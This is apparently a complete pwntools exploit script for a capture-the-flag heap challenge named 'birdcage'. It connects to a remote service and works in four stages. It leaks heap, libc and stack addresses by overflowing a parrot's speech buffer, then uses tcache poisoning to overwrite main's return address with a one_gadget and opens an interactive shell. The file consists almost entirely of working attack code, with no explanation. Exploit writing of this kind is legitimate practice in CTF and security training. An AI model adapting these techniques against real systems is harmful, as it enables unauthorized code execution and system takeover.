#!/usr/bin/env python3

import subprocess
from pwn import *

exe = ELF("./birdcage_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
libc.sym['one_gadget'] = 0x10a38c    # Need to before getting libc base

context.binary = exe
# context.log_level = 'debug'

def capture(index, bird, talk=''):
	data = 'capture ' + str(index) + ' ' + bird
	p.sendlineafter(b'>', data.encode())
	if bird=='parrot':
		p.sendlineafter(b'Pls talk:', talk)

def sing(index):
	p.sendlineafter(b'>', 'sing {}'.format(index).encode())
	return p.recvuntil(b'>')

def dismiss(index):
	p.sendlineafter(b'>', 'dismiss {}'.format(index).encode())

def list():
	p.sendlineafter(b'>', b'list')

def leave():
	p.sendlineafter(b'>', b'leave')

def GDB():
	command = '''
	b*0x0000000000402457
	b*0x0000000000401ee8
	b*0x4020c9
	b*0x40201c
	b*0x4021e5
	b*0x403562
	b*0x0000000000402133
	b*0x0000000000402541
	c
	heap chunks
	'''
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['/usr/bin/x-terminal-emulator', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb

# p = process('./birdcage_patched')
p = connect('34.136.108.210', 40003)

##################################
### Stage 1: Leak heap address ###
##################################
log.info('Stage 1: Leak heap address...')
parrot_sing_got = 0x0000000000604d08
cage = 0x605380

capture(0, 'parrot', b'0'*0x10)
capture(1, 'parrot', b'1'*0x10)
capture(0, 'parrot', b'0'*0x20 + p64(cage))
for i in range(1, 6):
	capture(0, 'parrot', b'0'*(0x20-i))
capture(0, 'parrot', b'0'*0x18 + p32(parrot_sing_got))

heap_leak = sing(1)[1:-2]
heap_leak = u64(heap_leak + b'\x00'*(8-len(heap_leak)))
log.success('Leak heap address: ' + hex(heap_leak))

##################################
### Stage 2: Leak libc address ###
##################################
log.info('Stage 2: Leak libc address...')
parrot_sing_got = 0x0000000000604d08
alarm_got = 0x00000000006050d8

p.sendline(b'capture 0 parrot')
p.sendlineafter(b'Pls talk:', b'0'*0x20 + p64(alarm_got))
for i in range(1, 6):
	capture(0, 'parrot', b'0'*(0x20-i))
capture(0, 'parrot', b'0'*0x18 + p32(parrot_sing_got))

alarm_addr = u64(sing(1)[1:-2] + b'\x00\x00')
log.success('Leak libc address: ' + hex(alarm_addr))
libc.address = alarm_addr - libc.sym['alarm']
log.success('Libc base: ' + hex(libc.address))

###################################
### Stage 3: Leak stack address ###
###################################
log.info('Stage 3: Leak stack address...')
p.sendline(b'capture 0 parrot')
p.sendlineafter(b'Pls talk:', b'0'*0x20 + p64(libc.sym['environ']))
for i in range(1, 6):
	capture(0, 'parrot', b'0'*(0x20-i))
capture(0, 'parrot', b'0'*0x18 + p32(parrot_sing_got))

stack_leak = u64(sing(1)[1:-2] + b'\x00\x00')
log.success('Stack address: ' + hex(stack_leak))
ret_addr = stack_leak - 0xf0
log.success('Ret address: ' + hex(ret_addr))

##########################
### Stage 4: Get shell ###
##########################
log.info('Stage 4: Get shell...')
p.sendline(b'capture 2 parrot')
p.sendlineafter(b'Pls talk:', b'2'*0x10)
capture(3, 'parrot', b'3'*0x10)
dismiss(3)
dismiss(2)

# Overwrite forward pointer with ret_addr - 0x18
capture(0, 'parrot', b'0'*0x48 + p64(ret_addr-0x18))

# Malloc and overwrite stack at main return
capture(3, 'parrot', b'2'*0x10)
capture(2, 'parrot', p64(libc.sym['one_gadget']))

p.sendline(b'leave')
p.interactive()


